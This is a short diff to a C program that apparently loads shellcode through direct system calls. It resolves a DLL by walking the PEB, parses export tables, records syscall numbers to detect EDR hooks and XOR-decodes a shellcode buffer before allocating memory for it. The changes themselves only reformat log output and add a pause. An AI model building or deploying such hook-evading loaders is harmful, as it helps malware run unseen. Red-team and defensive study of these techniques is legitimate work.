@@ -53,9 +53,9 @@ int main(int argc, char* argv[])
 
 	//output
 	printf("[+] Found PEB at %p\n", pPeb);
-	printf("[+] Found PEB_LDR_DATA struct at %p\n", pLdr);
-	printf("[+] Found head of InMemoryOrderModuleList at %p\n", pHeadNode);
-	printf("[+] Found %ls at %x\n", TargetDLL, pModuleAddr);
+	printf("\t[*] Found PEB_LDR_DATA struct at %p\n", pLdr);
+	printf("\t[*] Found head of InMemoryOrderModuleList at %p\n", pHeadNode);
+	printf("\t[*] Found %ls at %p\n", TargetDLL, pModuleAddr);
 
 	//find address of functions we need to detect if hooks are present
 	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pModuleAddr;
@@ -77,10 +77,11 @@ int main(int argc, char* argv[])
 	PIMAGE_EXPORT_DIRECTORY pImgExportDir = GetImgExportDir(pBase, pNtHeader);
 
 	//output
-	printf("[+] Successfully parsed DOS header at address %p\n", pDosHeader);
-	printf("[+] Successfully parsed NT header at address %p\n", pNtHeader);
-	printf("[+] Successfully parsed the export directory at address %p\n", pImgExportDir);
-	printf("[+] Successfully retrieved function names, addresses and ordinals\n");
+	printf("[+] Parsing dll for function addresses\n");
+	printf("\t[*] Successfully parsed DOS header at address %p\n", pDosHeader);
+	printf("\t[*] Successfully parsed NT header at address %p\n", pNtHeader);
+	printf("\t[*] Successfully parsed the export directory at address %p\n", pImgExportDir);
+	printf("\t[*] Successfully retrieved function names, addresses and ordinals\n");
 
 	//populate VX_TABLE
 	//initialize the hashes we need to check for, if found we save the SSN
@@ -124,6 +125,8 @@ int main(int argc, char* argv[])
 
 	//decode the shellcode
 	XorShellcode(&buf, sizeof(buf));
+
+	getchar();
 
 	//perform the systemcalls
 	// Allocate memory for the shellcode
